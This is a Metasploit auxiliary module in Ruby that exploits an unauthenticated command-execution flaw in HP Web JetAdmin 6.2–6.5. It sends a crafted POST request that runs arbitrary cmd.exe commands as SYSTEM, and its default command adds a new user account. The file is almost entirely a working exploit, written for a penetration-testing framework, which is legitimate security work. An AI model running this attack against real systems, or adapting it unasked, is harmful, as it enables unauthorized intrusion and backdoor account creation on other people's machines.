##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'HP Web JetAdmin 6.5 Server Arbitrary Command Execution',
        'Description' => %q{
          This module abuses a command execution vulnerability within the
          web based management console of the Hewlett-Packard Web JetAdmin
          network printer tool v6.2 - v6.5. It is possible to execute commands
          as SYSTEM without authentication. The vulnerability also affects POSIX
          systems, however at this stage the module only works against Windows.
          This module does not apply to HP printers.
        },
        'Author' => [ 'aushack' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'OSVDB', '5798' ],
          [ 'BID', '10224' ],
          [ 'EDB', '294' ]
        ],
        'DisclosureDate' => '2004-04-27',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8000),
        OptString.new('CMD', [ false, 'The command to execute.', 'net user metasploit password /add' ]),
      ]
    )
  end

  def run
    cmd = datastore['CMD'].gsub(' ', ',')

    send_request_cgi({
      'uri' => '/plugins/framework/script/content.hts',
      'method' => 'POST',
      'data' => 'obj=Httpd:ExecuteFile(,cmd.exe,/c,' + cmd + ',)'
    }, 3)
  end
end
